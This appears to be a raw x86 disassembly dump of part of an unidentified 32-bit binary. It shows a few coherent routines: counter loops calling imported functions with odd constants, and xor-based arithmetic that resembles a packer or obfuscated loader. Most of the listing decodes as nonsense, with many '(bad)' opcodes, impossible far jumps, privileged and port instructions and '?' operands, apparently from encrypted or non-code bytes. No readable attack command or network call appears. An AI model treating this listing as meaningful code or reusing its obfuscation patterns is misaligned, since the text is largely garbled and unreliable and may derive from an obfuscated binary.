  4050c7:	in     eax,0xa5
  4050c9:	ss popf 
  4050cb:	out    dx,eax
  4050cc:	mov    eax,ds:0x667c749d
  4050d1:	mov    ebx,0xefb8ce72
  4050d6:	mov    dh,0x43
  4050d9:	pop    edx
  4050da:	mov    dl,0xac
  4050dc:	mov    ebx,DWORD PTR [ebp-0x18]
  4050df:	xor    ebx,eax
  4050e1:	sub    edx,ecx
  4050e3:	lea    edi,[edi+ebx*1+0x32729d]
  4050ea:	cmp    edi,edx
  4050ec:	jbe    0x404654
  4050f2:	mov    edx,DWORD PTR [ebp-0xc]
  4050f5:	mov    edi,DWORD PTR [ebp-0x24]
  4050f8:	xor    edx,eax
  4050fa:	add    edx,ecx
  4050fc:	jmp    0x4052a6
  405101:	pop    edi
  405102:	mov    DWORD PTR [ebp+ebx*8-0x42980294],edx
  405109:	sbb    al,0x25
  40510b:	or     ebx,ecx
  40510d:	mov    al,0x15
  40510f:	int3   
  405110:	and    al,BYTE PTR [ebp+0x22]
  405113:	jle    0x405193
  405115:	mov    edi,DWORD PTR [edi+0x7e]
  405118:	jle    0x4050b0
  40511a:	sub    bh,BYTE PTR [ebx+0x2f047eac]
  405120:	adc    eax,0xe6e8da1f
  405125:	mov    ch,0x42
  405127:	leave  
  405128:	push   ebp
  405129:	xlat   BYTE PTR ds:[ebx]
  40512a:	retf   
  40512b:	jle    0x40510e
  40512d:	adc    DWORD PTR [edi+eiz*1-0x71],0x78
  405132:	mov    esi,fs
  405134:	mov    edi,0x89993729
  405139:	push   esi
  40513a:	add    ah,ch
  40513c:	mov    al,ds:0xe3edaeca
  405141:	xchg   ecx,eax
  405142:	mov    cs,WORD PTR [edi+edx*1]
  405145:	stc    
  405146:	(bad)  
  405147:	fstp   QWORD PTR [eax]
  405149:	cli    
  40514a:	pop    edx
  40514b:	push   edx
  40514c:	xor    esi,DWORD PTR [ebp+0x54]
  40514f:	cdq    
  405150:	fmul   DWORD PTR [esi]
  405152:	outs   dx,DWORD PTR ds:[esi]
  405153:	test   ah,0x81
  405156:	(bad)
  405159:	fst    QWORD PTR [edi]
  40515b:	push   ds
  40515c:	add    DWORD PTR [ebx-0x13],ecx
  40515f:	loopne 0x4050f9
  405161:	loope  0x405199
  405163:	enter  0xc33,0x8a
  405167:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405168:	xor    al,0x86
  40516a:	jmp    0x5a541b47
  40516f:	dec    ebp
  405170:	push   esi
  405171:	ret    
  405172:	je     0x405115
  405174:	hlt    
  405175:	stc    
  405176:	and    DWORD PTR [ecx-0x5f],esi
  405179:	lahf   
  40517a:	sar    DWORD PTR [ecx],1
  40517c:	outs   dx,DWORD PTR ds:[esi]
  40517d:	(bad)  
  40517e:	rcr    BYTE PTR [ecx-0x17526689],1
  405184:	arpl   sp,bx
  405186:	ins    BYTE PTR es:[edi],dx
  405187:	test   eax,0x343703db
  40518c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40518d:	(bad)  
  40518e:	(bad)  
  40518f:	out    0x5f,eax
  405191:	xor    al,0x1d
  405193:	or     al,0x66
  405195:	popa   
  405196:	and    eax,0x5e0f6c0c
  40519b:	inc    ebp
  40519c:	dec    ebx
  40519d:	pop    ss
  40519e:	sbb    eax,ebx
  4051a0:	test   eax,0xef2168ed
  4051a5:	push   cs
  4051a6:	iret   
  4051a7:	lods   eax,DWORD PTR ds:[esi]
  4051a8:	sbb    eax,0x313a46be
  4051ad:	or     BYTE PTR [eax+0x59],bl
  4051b0:	cld    
  4051b1:	aaa    
  4051b2:	xor    edi,DWORD PTR [esi]
  4051b4:	iret   
  4051b5:	add    BYTE PTR [ebx-0x71599413],0x54
  4051bc:	inc    edi
  4051bd:	inc    ebp
  4051be:	push   ebx
  4051bf:	xchg   edi,eax
  4051c0:	lds    eax,FWORD PTR [ebp+ebp*2-0x3c13856f]
  4051c7:	into   
  4051c8:	jecxz  0x4051bf
  4051ca:	mov    al,ds:0x330d69d
  4051cf:	dec    esi
  4051d0:	push   ss
  4051d1:	xchg   esp,eax
  4051d2:	jae    0x4051fa
  4051d4:	pop    edx
  4051d5:	test   BYTE PTR [ecx],ah
  4051d7:	mov    bh,0xa6
  4051d9:	mov    dl,0x3d
  4051db:	mov    eax,DWORD PTR [edi+0x5]
  4051de:	lock xor bh,BYTE PTR [ecx-0x6c]
  4051e2:	xor    al,0xb2
  4051e4:	mov    esi,0x99a51c8f
  4051e9:	pop    ebx
  4051ea:	imul   eax,DWORD PTR [eax+edi*8+0x628aa55b],0x395fd9c6
  4051f5:	jnp    0x405201
  4051f7:	in     al,0x45
  4051f9:	xor    BYTE PTR [ebp+0x6748aa6c],dh
  4051ff:	adc    ebp,DWORD PTR [ebp+0x27]
  405202:	mov    al,ds:0xd9118e0d
  405207:	cmp    ebx,DWORD PTR [eax-0x6]
  40520a:	int    0xc9
  40520c:	pop    esp
  40520d:	sub    edi,DWORD PTR [ebx+0xc]
  405210:	js     0x405286
  405212:	jns    0x4051af
  405214:	inc    esp
  405215:	push   ebp
  405216:	call   0xd590:0xecb78802
  40521d:	sub    bh,BYTE PTR [eax-0x50]
  405220:	rcr    BYTE PTR ds:0xe51f5021,0x62
  405227:	mov    edi,0xdb1a60a2
  40522c:	cwde   
  40522d:	and    bh,dh
  40522f:	lock jl 0x4051e2
  405232:	mov    esi,0xef98ec86
  405237:	xchg   BYTE PTR ds:0x874073c2,dl
  40523d:	push   si
  40523f:	rol    BYTE PTR [esi],1
  405241:	out    0x50,al
  405243:	cmp    esp,DWORD PTR [ebp+0x3d1bdc0c]
  405249:	mov    edi,ebx
  40524b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40524c:	fnstenv [eax]
  40524e:	mov    WORD PTR [edi+eax*1-0x872a7e0],?
  405255:	not    BYTE PTR [edi]
  405257:	ret    0xc4ef
  40525a:	pushf  
  40525b:	inc    ebp
  40525c:	aam    0xe8
  40525e:	ss inc eax
  405260:	add    eax,0x83c51177
  405265:	es pop ss
  405267:	pop    eax
  405268:	imul   esi,esp,0xfffffff5
  40526b:	cmp    ebp,DWORD PTR [edx+0x232914f2]
  405271:	inc    esi
  405272:	cmp    DWORD PTR [edi+0x55],ebx
  405275:	mov    bh,0x26
  405277:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405278:	inc    ebp
  405279:	jb     0x405225
  40527b:	repz aam 0x16
  40527e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40527f:	push   es
  405280:	(bad)  
  405281:	pop    esi
  405282:	mov    BYTE PTR [ebx+0x4bf6ff42],bh
  405288:	mov    bl,0x18
  40528a:	loop   0x4052ec
  40528c:	xchg   BYTE PTR [ebx],cl
  40528e:	push   esp
  40528f:	adc    ebp,esp
  405291:	sbb    esi,DWORD PTR [edx-0x1f]
  405294:	dec    eax
  405295:	add    BYTE PTR [ebx+0x45],bh
  405298:	test   DWORD PTR ds:0xcc985be8,0x4ceaa11e
  4052a2:	or     BYTE PTR [ebp+0x46],cl
  4052a5:	jne    0x4052b6
  4052a7:	scas   eax,DWORD PTR es:[edi]
  4052a8:	xlat   BYTE PTR ds:[ebx]
  4052a9:	mov    edi,DWORD PTR [ebp-0x18]
  4052ac:	xor    edi,eax
  4052ae:	add    edx,edi
  4052b0:	mov    edi,DWORD PTR [ebp-0x8]
  4052b3:	lea    edx,[edx+edi*1+0x32729d]
  4052ba:	mov    DWORD PTR [ebp-0x8],edx
  4052bd:	mov    edx,DWORD PTR [ebp-0x20]
  4052c0:	xor    edx,eax
  4052c2:	mov    edi,0xffcd8d63
  4052c7:	sub    edi,edx
  4052c9:	add    edi,DWORD PTR [ebp-0x10]
  4052cc:	mov    edx,DWORD PTR [ebp-0x20]
  4052cf:	mov    ebx,DWORD PTR [ebp-0x8]
  4052d2:	xor    edx,eax
  4052d4:	add    edx,ecx
  4052d6:	imul   edx,ebx
  4052d9:	cmp    edx,edi
  4052db:	jbe    0x403ae8
  4052e1:	pop    ebx
  4052e2:	pop    edi
  4052e3:	leave  
  4052e4:	ret    0x8
  4052e7:	push   ebp
  4052e8:	mov    ebp,esp
  4052ea:	push   ecx
  4052eb:	and    DWORD PTR ds:0x4305a6,0x0
  4052f5:	jmp    0x405305
  4052fa:	mov    eax,ds:0x4305a6
  4052ff:	inc    eax
  405300:	mov    ds:0x4305a6,eax
  405305:	cmp    DWORD PTR ds:0x4305a6,0x18
  40530c:	jae    0x40536e
  405312:	cmp    DWORD PTR ds:0x4305a6,0x4
  405319:	jne    0x40533f
  40531f:	push   0x7989
  405324:	push   0x6fea
  405329:	push   DWORD PTR [ebp-0x28]
  40532c:	push   0x5a2e
  405331:	push   DWORD PTR [ebp-0x24]
  405334:	push   0x2930
  405339:	call   DWORD PTR ds:0x42eba8
  40533f:	cmp    DWORD PTR ds:0x4305a6,0x3
  405346:	jne    0x405357
  40534c:	mov    eax,ds:0x4305a6
  405351:	inc    eax
  405352:	mov    ds:0x4305a6,eax
  405357:	jmp    0x4052fa
  40535c:	mov    eax,ds:0x4305da
  405361:	xor    edx,edx
  405363:	add    edx,DWORD PTR ds:0x43066a
  405369:	sub    eax,edx
  40536b:	or     eax,DWORD PTR [eax+edx*1]
  40536e:	push   ecx
  40536f:	or     eax,DWORD PTR ds:0x4305c2
  405375:	mov    eax,0xf89c8535
  40537a:	sbb    DWORD PTR ds:0x4305b2,ecx
  405380:	mov    DWORD PTR [ebp-0x8],eax
  405383:	movzx  ecx,BYTE PTR ds:0x4305a6
  40538a:	add    DWORD PTR ds:0x42e872,ecx
  405390:	mov    DWORD PTR [ebp-0x4],0xf89c8532
  405397:	and    DWORD PTR ds:0x4305be,0x0
  4053a1:	mov    ecx,DWORD PTR ds:0x4305be
  4053a7:	inc    ecx
  4053a8:	mov    DWORD PTR ds:0x4305be,ecx
  4053ae:	cmp    DWORD PTR ds:0x4305be,0x22
  4053b5:	jne    0x4053c9
  4053bb:	push   DWORD PTR [ebp-0x24]
  4053be:	push   0x8601
  4053c3:	call   DWORD PTR ds:0x42eca0
  4053c9:	cmp    DWORD PTR ds:0x4305be,0x12
  4053d0:	jb     0x4053a1
  4053d6:	and    DWORD PTR ds:0x42ef14,0x0
  4053e0:	mov    ecx,DWORD PTR ds:0x42ef14
  4053e6:	inc    ecx
  4053e7:	mov    DWORD PTR ds:0x42ef14,ecx
  4053ed:	cmp    DWORD PTR ds:0x42ef14,0x7
  4053f4:	jne    0x405405
  4053fa:	push   0x68cd
  4053ff:	call   DWORD PTR ds:0x42eae4
  405405:	cmp    DWORD PTR ds:0x42ef14,0x6
  40540c:	jne    0x40541f
  405412:	mov    ecx,DWORD PTR ds:0x42ef14
  405418:	inc    ecx
  405419:	mov    DWORD PTR ds:0x42ef14,ecx
  40541f:	cmp    DWORD PTR ds:0x42ef14,0x1d
  405426:	jb     0x4053e0
  40542c:	mov    edx,DWORD PTR [ebp-0x8]
  40542f:	push   esi
  405430:	mov    ecx,0x7510856
  405435:	xor    edx,ecx
  405437:	mov    esi,0x32729d
  40543c:	push   edi
  40543d:	mov    edi,DWORD PTR [ebp+0x10]
  405440:	add    edx,esi
  405442:	jmp    0x40581e
  405447:	sub    dl,BYTE PTR [edi+0x7c7d3afd]
  40544d:	in     eax,dx
  40544e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40544f:	ins    DWORD PTR es:[edi],dx
  405450:	ret    
  405451:	mov    ecx,0x85c42809
  405456:	jp     0x40542a
  405458:	and    al,0x7e
  40545a:	jle    0x405419
  40545c:	jno    0x4054dc
  40545e:	jle    0x405418
  405460:	call   DWORD PTR [ebx+0x73]
  405463:	outs   dx,BYTE PTR ds:[esi]
  405464:	fnstcw WORD PTR [edx]
  405466:	icebp  
  405467:	inc    ebx
  405468:	add    ebx,edx
  40546a:	gs cmp eax,0x10938ae7
  405470:	outs   dx,BYTE PTR ds:[esi]
  405471:	xor    ecx,edx
  405473:	fld    QWORD PTR [ecx]
  405475:	add    al,0xc7
  405477:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405478:	sbb    al,BYTE PTR [eax]
  40547a:	pop    ebx
  40547b:	popa   
  40547c:	fcmovne st,st(3)
  40547e:	shr    DWORD PTR [edi],cl
  405480:	pusha  
  405481:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405482:	mov    ds:0x72a77656,eax
  405487:	jo     0x4054e0
  405489:	xchg   edx,eax
  40548a:	xchg   ebp,eax
  40548b:	push   eax
  40548c:	les    ebx,FWORD PTR [ecx]
  40548e:	adc    BYTE PTR [ecx],0x7b
  405491:	sbb    DWORD PTR [eax],edx
  405493:	add    DWORD PTR [edx],0x2e
  405496:	sbb    DWORD PTR [ebx],edi
  405498:	bound  esp,QWORD PTR ds:0x1f57de9d
  40549e:	lds    edx,FWORD PTR [esi+0x26]
  4054a1:	loope  0x4054d7
  4054a3:	push   cs
  4054a4:	aaa    
  4054a5:	mov    ds:0x46f75255,al
  4054aa:	jno    0x40551d
  4054ac:	or     BYTE PTR [edi],al
  4054ae:	cmps   DWORD PTR es:[si],DWORD PTR es:[di]
  4054b1:	into   
  4054b2:	jns    0x40543c
  4054b4:	xchg   esi,eax
  4054b5:	dec    ecx
  4054b6:	push   0xffffffe2
  4054b8:	lds    eax,FWORD PTR [edi-0xf]
  4054bb:	cmp    BYTE PTR [esi-0x1f],0xdd
  4054bf:	(bad)  
  4054c0:	dec    ebp
  4054c1:	pop    ebx
  4054c2:	dec    esp
  4054c3:	inc    ebp
  4054c4:	xlat   BYTE PTR ds:[ebx]
  4054c5:	dec    BYTE PTR [edx+0x37]
  4054c8:	dec    ebx
  4054c9:	ret    0xff49
  4054cc:	fild   QWORD PTR [edx]
  4054ce:	loopne 0x40547e
  4054d0:	pop    edi
  4054d1:	pop    es
  4054d2:	loope  0x405498
  4054d4:	dec    ebx
  4054d5:	adc    al,0xaf
  4054d7:	gs dec edi
  4054d9:	or     al,0xb0
  4054db:	lahf   
  4054dc:	test   DWORD PTR [edx-0x5b9e7b96],esp
  4054e2:	stos   DWORD PTR es:[edi],eax
  4054e3:	and    esp,ecx
  4054e5:	sbb    eax,DWORD PTR [edi]
  4054e7:	adc    DWORD PTR [esi],esp
  4054e9:	ds jmp 0x954f:0xf904ccc1
  4054f1:	sbb    BYTE PTR [ebx-0x45],ah
  4054f4:	out    0x50,al
  4054f6:	adc    BYTE PTR [ebx],bl
  4054f8:	mov    ?,WORD PTR [eax+0x7297ba36]
  4054fe:	fst    QWORD PTR [edi]
  405500:	adc    DWORD PTR [esi],eax
  405502:	fsub   QWORD PTR [edi-0x20]
  405505:	pop    ebp
  405506:	jae    0x4054a6
  405508:	call   0x9d3a1f3f
  40550d:	mov    ebx,0xafdffee1
  405512:	popa   
  405513:	sbb    DWORD PTR [eax+eiz*2-0x36],esp
  405517:	shr    BYTE PTR [ecx],cl
  405519:	and    eax,0x659423ef
  40551e:	pop    esi
  40551f:	adc    ecx,ecx
  405521:	test   DWORD PTR [edi],ebx
  405523:	les    edx,FWORD PTR [eax]
  405525:	cmc    
  405526:	pop    edx
  405527:	rcr    DWORD PTR [eax],0xa0
  40552a:	push   ds
  40552b:	sub    bh,BYTE PTR [ebp-0x6a554b59]
  405531:	lea    edi,[ebx-0x64]
  405534:	je     0x4055ae
  405536:	fdivr  QWORD PTR [edx+0x34]
  405539:	(bad)  
  40553a:	pop    ebp
  40553b:	fs (bad) 
  40553d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40553e:	xchg   BYTE PTR [ebx],ah
  405540:	lahf   
  405541:	dec    esi
  405542:	mov    cl,0x95
  405544:	clc    
  405545:	sbb    eax,0x90aad4f8
  40554a:	(bad)  
  40554c:	jne    0x405530
  40554e:	loopne 0x4054ed
  405550:	scas   al,BYTE PTR es:[edi]
  405551:	pop    esp
  405552:	push   ebx
  405553:	inc    esi
  405554:	inc    eax
  405555:	jl     0x40555e
  405557:	loopne 0x4055a2
  405559:	pop    edx
  40555a:	(bad)  
  40555b:	jbe    0x4055ad
  40555d:	sti    
  40555e:	xchg   edx,eax
  40555f:	loop   0x4055cc
  405561:	nop
  405562:	and    esp,esi
  405564:	(bad)  
  405565:	cwde   
  405566:	push   edx
  405567:	out    0x76,al
  405569:	sbb    BYTE PTR [esi],al
  40556b:	jecxz  0x4055c3
  40556d:	mov    al,0xca
  40556f:	mov    ah,0x36
  405571:	add    esi,DWORD PTR [edx-0x7345dc18]
  405577:	xor    ah,BYTE PTR [edx+edx*4-0x28]
  40557b:	int    0x88
  40557d:	mov    bl,BYTE PTR [ebp+0x54]
  405580:	push   ss
  405581:	hlt    
  405582:	clc    
  405583:	sub    ah,0xee
  405586:	dec    edi
  405587:	(bad)  
  405588:	mov    ch,0x69
  40558a:	retf   
  40558b:	mov    DWORD PTR [eax],edi
  40558d:	xchg   ebx,eax
  40558e:	pop    ebp
  40558f:	jmp    0x84e6:0xae2dcf1
  405596:	in     eax,dx
  405597:	xor    eax,0x88084b08
  40559c:	(bad)  
  40559d:	add    al,0x86
  40559f:	ret    0x35d4
  4055a2:	or     BYTE PTR [eax],dl
  4055a4:	popf   
  4055a5:	xchg   esp,eax
  4055a6:	mov    ds,WORD PTR [esi]
  4055a8:	(bad)  
  4055a9:	fst    st(7)
  4055ab:	out    0xdd,al
  4055ad:	sbb    ebp,ebx
  4055af:	cdq    
  4055b0:	or     al,0x9a
  4055b2:	in     eax,dx
  4055b3:	call   FWORD PTR [eax-0x42794b47]
  4055b9:	mov    ch,al
  4055bb:	js     0x405592
  4055bd:	fimul  DWORD PTR ss:[edx+0x32]
  4055c1:	aam    0x43
  4055c3:	clc    
  4055c4:	pop    ebp
  4055c5:	xlat   BYTE PTR ds:[ebx]
  4055c6:	pop    eax
  4055c8:	jmp    0xcf435184
  4055cd:	pop    ecx
  4055ce:	lds    esi,FWORD PTR [ebx+0x62cc7e5c]
  4055d4:	lock sbb eax,0xfe9b30a2
  4055da:	xchg   edi,eax
  4055db:	jp     0x405643
  4055dd:	sub    eax,0x726ea8e9
  4055e2:	(bad)  
  4055e3:	push   edi
  4055e4:	pop    ecx
  4055e5:	out    0xb,al
  4055e7:	xor    eax,0xb8685db6
  4055ec:	pop    ebp
  4055ed:	xchg   esp,eax
  4055ee:	push   esp
  4055ef:	sbb    al,BYTE PTR [ebp-0xf]
  4055f2:	adc    ebp,esp
  4055f4:	cmp    DWORD PTR [ecx-0xd8d0d55],0x8aec1a33
  4055fe:	les    edx,FWORD PTR [esi+0x52]
  405601:	mov    ch,BYTE PTR [ebx+0x2d]
  405604:	fwait
  405605:	inc    esp
  405606:	dec    edx
  405607:	pcmpeqb mm2,QWORD PTR [ebx]
  40560a:	inc    edx
  40560b:	mov    DWORD PTR [edx-0x37614b23],edi
  405611:	rol    esp,0x7e
  405614:	lea    ebp,[ecx+0x75]
  405617:	adc    eax,0xea5caa05
  40561c:	fisubr WORD PTR [ebx]
  40561e:	cmp    al,0xdb
  405620:	add    cl,dh
  405622:	pop    edi
  405623:	dec    edi
  405624:	jge    0x405660
  405626:	mov    ss,WORD PTR [esi]
  405628:	mov    dl,0x77
  40562a:	(bad)  
  40562b:	mov    dl,0x55
  40562d:	fsub   DWORD PTR [ebx]
  40562f:	not    DWORD PTR [edx]
  405631:	nop
  405632:	mov    ecx,0xac8add55
  405637:	adc    ah,BYTE PTR [ecx-0x3b]
  40563a:	jp     0x40568e
  40563c:	and    esp,DWORD PTR [eax]
  40563e:	cwde   
  40563f:	ret    
  405640:	and    DWORD PTR [ebx+0x42848902],ecx
  405646:	fs repnz retf 0xec9
  40564b:	dec    ecx
  40564c:	lds    edx,FWORD PTR [edi]
  40564e:	sahf   
  40564f:	or     al,0x58
  405651:	cmp    al,0x3a
  405653:	imul   esp,DWORD PTR [edx+edi*2-0x5e],0x8e593b96
  40565b:	add    eax,0x21264825
  405660:	call   0x833e7abc
  405665:	es mov ah,0x58
  405668:	cld    
  405669:	or     edx,DWORD PTR [ebp+0x3088527a]
  40566f:	add    al,0xbf
  405671:	and    DWORD PTR [eax+edi*4-0x48],0x83b476c6
  405679:	retf   0xacad
  40567c:	loopne 0x405685
  40567e:	inc    eax
  40567f:	std    
  405680:	repz arpl WORD PTR [edi-0x16],bx
  405684:	inc    eax
  405685:	in     eax,dx
  405686:	push   ds
  405687:	sbb    BYTE PTR [ebp+0x16a44da6],al
  40568d:	adc    DWORD PTR [edi+0x5c],ecx
  405690:	arpl   WORD PTR [edx],bp
  405692:	adc    esi,DWORD PTR [ebx+eiz*2+0x78]
  405696:	jl     0x4056c7
  405698:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405699:	push   ss
  40569a:	adc    al,0x1b
  40569c:	inc    ebx
  40569d:	mov    bl,0x1d
  40569f:	out    dx,eax
  4056a0:	jno    0x4056c4
  4056a2:	adc    edi,DWORD PTR [esp+ebp*4+0x2e]
  4056a6:	xchg   ecx,eax
  4056a7:	add    BYTE PTR [esi+0x62952de1],dh
  4056ad:	fcmovnbe st,st(7)
  4056af:	in     eax,0xc8
  4056b1:	cli    
  4056b2:	fcomp  QWORD PTR [edx+0x4ad54019]
  4056b8:	repnz add edx,DWORD PTR [esi+0x2a291ae8]
  4056bf:	inc    ecx
  4056c0:	push   0xeecd94c9
  4056c5:	dec    ebp
  4056c6:	inc    esp
  4056c7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4056c8:	mov    al,0x2c
  4056ca:	sbb    BYTE PTR [ebx+edi*2+0x2d],ah
  4056ce:	push   0x410055f3
  4056d3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4056d4:	cwde   
  4056d5:	in     eax,0x46
  4056d7:	push   es
  4056d8:	into   
  4056d9:	fdiv   st(7),st
  4056db:	inc    esi
  4056dc:	push   edx
  4056dd:	push   cs
  4056de:	repnz or al,0xe7
  4056e1:	iret   
  4056e2:	push   eax
  4056e3:	inc    esi
  4056e4:	repnz adc al,0xac
  4056e7:	pop    ds
  4056e8:	jne    0x4056f6
  4056ea:	xor    al,0xe1
  4056ec:	push   ebp
  4056ed:	cmp    ebx,eax
  4056ef:	xchg   ebp,eax
  4056f0:	mov    bh,0xe
  4056f2:	pop    esi
  4056f3:	mov    WORD PTR [ebx],?
  4056f5:	fwait
  4056f6:	push   0xffffff82
  4056f8:	and    BYTE PTR [esi],bl
  4056fa:	push   0x13
  4056fc:	add    al,0x69
  4056fe:	loopne 0x4056f1
  405700:	repnz fidivr WORD PTR [ebx-0x4da45b91]
  405707:	jae    0x40571b
  405709:	cwde   
  40570a:	ins    DWORD PTR es:[edi],dx
  40570b:	lds    ecx,FWORD PTR [edx-0x5f]
  40570e:	push   esi
  40570f:	gs adc eax,0x96c147b6
  405715:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405716:	in     al,0x51
  405718:	iret   
  405719:	dec    ecx
  40571a:	lds    edi,FWORD PTR [ebx+eiz*1+0x69536fa3]
  405721:	sar    edx,cl
  405723:	or     DWORD PTR [ebp-0x40c46213],0xb1723cf1
  40572d:	shl    BYTE PTR [eax+ecx*2+0x3d6254c5],1
  405734:	fucomi st,st(7)
  405736:	xchg   ecx,eax
  405737:	sahf   
  405738:	stos   DWORD PTR es:[edi],eax
  405739:	sahf   
  40573a:	nop    DWORD PTR gs:[eax+0x794465f8]
  405742:	jmp    0x6dc06c1e
  405747:	fdivr  QWORD PTR [eax-0x11d12667]
  40574d:	xor    ah,BYTE PTR [ebp-0x76]
  405750:	push   edi
  405751:	lods   eax,DWORD PTR ds:[esi]
  405752:	dec    ebx
  405753:	push   esi
  405754:	loope  0x4056ff
  405756:	fisttp WORD PTR [edx+0xef7df9d]
  40575c:	sbb    al,0xf1
  40575e:	repnz dec edi
  405760:	cmp    eax,0x4382df14
  405765:	out    dx,eax
  405766:	pop    ds
  405767:	retf   0x7b19
  40576a:	jo     0x405725
  40576c:	bound  esi,QWORD PTR [edi]
  40576e:	sti    
  40576f:	adc    al,0xe4
  405771:	popa   
  405772:	(bad)  
  405773:	test   al,0x37
  405775:	dec    ecx
  405776:	repz inc ebp
  405778:	inc    eax
  405779:	adc    al,0x25
  40577b:	mov    ds:0x96d9663,eax
  405780:	ficom  WORD PTR [edi-0x6]
  405783:	in     eax,dx
  405784:	add    al,0xb1
  405786:	call   0x9394:0xbbf4c5cb
  40578d:	adc    BYTE PTR [eax],ah
  40578f:	and    DWORD PTR [ebp+0x3f],esp
  405792:	mov    ds:0xa2534109,al
  405797:	in     al,0x16
  405799:	retf   
  40579a:	jl     0x4057de
  40579c:	ror    ch,1
  40579e:	mov    al,0x73
  4057a0:	int3   
  4057a1:	pusha  
  4057a2:	(bad)  
  4057a3:	or     bh,bh
  4057a5:	mov    bl,0x59
  4057a7:	xchg   ebx,eax
  4057a8:	cmp    BYTE PTR [ebx-0x2a48912f],0x32
  4057af:	(bad)  
  4057b0:	mov    al,ds:0x549ddd63
  4057b5:	ror    DWORD PTR [edx+0x3755c04c],cl
  4057bb:	loopne 0x405827
  4057bd:	lea    esi,[esi-0x7cce4e56]
  4057c3:	inc    edx
  4057c4:	daa    
  4057c5:	outs   dx,DWORD PTR ds:[esi]
  4057c6:	ja     0x405828
  4057c8:	and    DWORD PTR [ecx],esi
  4057ca:	mov    dh,0x5f
  4057cc:	popa   
  4057cd:	es scas al,BYTE PTR es:[edi]
  4057cf:	and    BYTE PTR [edi+0x7b],ah
  4057d2:	stos   DWORD PTR es:[edi],eax
  4057d3:	pop    edx
  4057d4:	push   ds
  4057d5:	jecxz  0x405809
  4057d7:	jp     0x4057dd
  4057d9:	int    0xff
  4057db:	pop    edi
  4057dc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4057dd:	iret   
  4057de:	imul   edx,DWORD PTR [ebx+0x20e0bfd2],0xffffffbb
  4057e5:	xor    BYTE PTR [esi-0x4d],dl
  4057e8:	test   eax,0x248eb553
  4057ed:	mov    eax,0x27a8b867
  4057f2:	xor    ebp,ebp
  4057f4:	int3   
  4057f5:	xchg   edi,eax
  4057f6:	je     0x4057b5
  4057f8:	mov    ebp,0xc60aee33
  4057fd:	aad    0xa0
  4057ff:	scas   eax,DWORD PTR es:[edi]
  405800:	popf   
  405801:	push   ecx
  405802:	adc    al,0xa1
  405804:	mov    ebp,0x3c1c19a0
  405809:	add    DWORD PTR [edi],edi
  40580b:	mov    cl,0x28
  40580d:	inc    ebx
  40580e:	mov    eax,ds:0x76bc6291
  405813:	repz pop es
  405815:	jae    0x40581d
  405817:	jmp    0x4057d7
  405819:	push   ecx
  40581a:	push   ebx
  40581b:	jp     0x4057bd
  40581d:	adc    edi,DWORD PTR [ebx]
  40581f:	cli    
  405820:	je     0x40642d
  405826:	mov    edx,DWORD PTR [ebp-0x8]
  405829:	mov    eax,DWORD PTR [ebp-0x4]
  40582c:	xor    eax,ecx
  40582e:	mov    edi,0xffcd8d63
  405833:	jmp    0x405c0f
  405838:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405839:	loop   0x4058ae
  40583b:	fmul   DWORD PTR [ebx-0x7]
  40583e:	jge    0x4058a4
  405840:	xor    BYTE PTR [edx+ebx*8-0x6c6ca8c4],bh
  405847:	ins    BYTE PTR es:[edi],dx
  405848:	adc    DWORD PTR [eax],edi
  40584a:	jle    0x4058ca
  40584c:	mov    ebp,0x557e7e71
  405851:	int3   
  405852:	jmp    0xb0f0:0x1292c978
  405859:	add    BYTE PTR [ebx],0x89
  40585c:	xor    cl,bh
  40585e:	push   ebx
  40585f:	xor    DWORD PTR [edx+0x75],0xb6586afe
  405866:	jo     0x4058a0
  405868:	or     WORD PTR [ebx+eiz*2-0x6b],di
  40586d:	xchg   bh,bh
  40586f:	xchg   ebx,eax
  405870:	mov    al,ds:0xbf5cca3b
  405875:	sub    esp,DWORD PTR [ecx+0x7d280c7f]
  40587b:	lock sbb dh,BYTE PTR [ecx+edx*8+0x7c93e190]
  405883:	cmp    eax,0xc24282d3
  405888:	loope  0x4058cd
  40588a:	push   edx
  40588b:	push   esi
  40588c:	pop    eax
  40588d:	and    ebp,DWORD PTR [esi]
  40588f:	or     eax,DWORD PTR [edx-0x26]
  405892:	test   al,0x4c
  405894:	test   BYTE PTR [edx+0x42],0xf5
  405898:	xchg   ebx,eax
  405899:	fisttp QWORD PTR [eax]
  40589b:	jecxz  0x40584f
  40589d:	push   esp
  40589e:	or     ebx,esi
  4058a0:	test   DWORD PTR [edi-0x25],esp
  4058a3:	push   0x7d94b9ba
  4058a8:	sbb    BYTE PTR [edx-0x36],0xd5
  4058ac:	and    ah,BYTE PTR [esi]
  4058ae:	inc    edx
  4058af:	mov    bl,0x6c
  4058b1:	sub    esi,DWORD PTR [edi-0x453453ed]
  4058b7:	jae    0x405899
  4058b9:	cdq    
  4058ba:	adc    BYTE PTR [ecx+0x74],dl
  4058bd:	mov    esi,DWORD PTR [ebx+0x5b]
  4058c0:	aaa    
  4058c1:	mov    al,0x7c
  4058c3:	xor    al,0x81
  4058c5:	loopne 0x4058e6
  4058c7:	adc    al,0x17
  4058c9:	pop    eax
  4058ca:	mov    ecx,?
  4058cc:	scas   al,BYTE PTR es:[edi]
  4058cd:	sub    eax,0xfb01fb77
  4058d2:	mov    cs,WORD PTR [ecx]
  4058d4:	mov    dl,0x47
  4058d6:	pop    esi
  4058d7:	aaa    
  4058d8:	nop
  4058d9:	outs   dx,BYTE PTR ds:[esi]
  4058da:	pusha  
  4058db:	add    ebp,DWORD PTR [edx]
  4058dd:	inc    edi
  4058de:	ins    DWORD PTR es:[edi],dx
  4058df:	cmp    eax,0x609a645d
  4058e4:	lahf   
  4058e5:	sub    edi,DWORD PTR [eax]
  4058e7:	pop    es
